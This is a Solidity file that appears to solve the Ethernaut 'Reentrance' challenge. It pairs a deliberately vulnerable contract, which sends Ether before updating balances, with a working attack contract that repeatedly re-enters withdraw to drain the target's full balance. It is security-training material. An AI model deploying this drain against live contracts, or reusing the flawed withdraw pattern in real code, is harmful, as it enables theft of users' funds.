// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract ReentranceCopy {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}

contract ReentranceAttack {
    // this contract was inspired by CMICHEL at https://cmichel.io/ethernaut-solutions/

    ReentranceCopy public reentranceInstance;
    uint256 initialDeposit;

    constructor(address payable _reentranceInstanceAddress) public {
        reentranceInstance = ReentranceCopy(_reentranceInstanceAddress);
    }

    function attack() external payable {
        require(msg.value >= 0.1 ether, "Send at least 0.1 Ether");
        // first deposit some funds via {value} and register as donator via (address) into balances mapping 
        initialDeposit = msg.value;
        reentranceInstance.donate{value: initialDeposit}(address(this));
        // call the withdraw function with reentrance exploit feature
        withdrawAllFunds();
    }

    receive() external payable {
        // call the withdraw function with reentrance exploit feature
        withdrawAllFunds();
    }
    
    // function to withdraw all funds from the Reentrance contract 
    function withdrawAllFunds() private {
        // first get balance of whole Reentrance contract
        uint256 totalBalance = getBalanceOfInstance();
        // check if the balance is not empty
        bool isBalanceEmpty = totalBalance > 0;
        // if balance of the contract is not empty, call withdraw function
        if (isBalanceEmpty) {
            // we can withdraw at most initial deposit, otherwise we would not pass the require statement 
            uint256 toWithdraw = initialDeposit < totalBalance ? initialDeposit : totalBalance;
            reentranceInstance.withdraw(toWithdraw);
        }
    }
    // get balance of the original reentrance contract
    function getBalanceOfInstance() public view returns(uint256) {
        return address(reentranceInstance).balance;
    }
    // withdraw funds from this contract
    function withdrawContract(address _to) public returns(bool){
        uint256 _amountToWithdraw = address(this).balance;
        (bool success, ) = address(_to).call{value: _amountToWithdraw}("");
        require(success);
    }
}